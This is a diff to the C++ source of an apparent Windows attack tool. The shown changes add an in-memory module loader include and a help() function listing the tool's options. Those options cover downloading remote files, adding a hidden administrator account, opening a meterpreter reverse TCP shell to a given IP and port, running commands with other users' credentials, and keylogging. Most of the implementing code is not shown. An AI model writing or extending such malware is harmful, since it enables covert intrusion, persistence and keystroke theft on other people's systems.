@@ -1,4 +1,5 @@
 #include "stdafx.h"
+
 #include"Keylogger.h"
 #include <WinSock2.h>
 #include <Windows.h>
@@ -10,6 +11,7 @@
 #include <stdexcept>
 #include <string>
 #include<TlHelp32.h>
+#include"MemoryModule.h"
 #pragma comment(lib,"urlmon.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "netapi32.lib")
@@ -298,16 +300,19 @@ int Kill(LPCTSTR strProcessName) {
 	return false;
 }
 
+void help() {
+	printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands] \n [-k | Keylogger -k -s stop Keylogger ]");
+}
 int main(int argc, char* argv[])
 {
 	
 	if (!(argc > 1)) {
-		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands]");
+		help();
 		exit(1);
 	}
 
 	if (strcmp(argv[1], "-h") == 0) {
-		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands]");
+		help();
 		exit(1);
 	}
 	else if (strcmp(argv[1],"-d")==0){
@@ -401,7 +406,7 @@ int main(int argc, char* argv[])
 	}
 	else
 	{
-		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands]");
+		help();
 		exit(1);
 	}
 
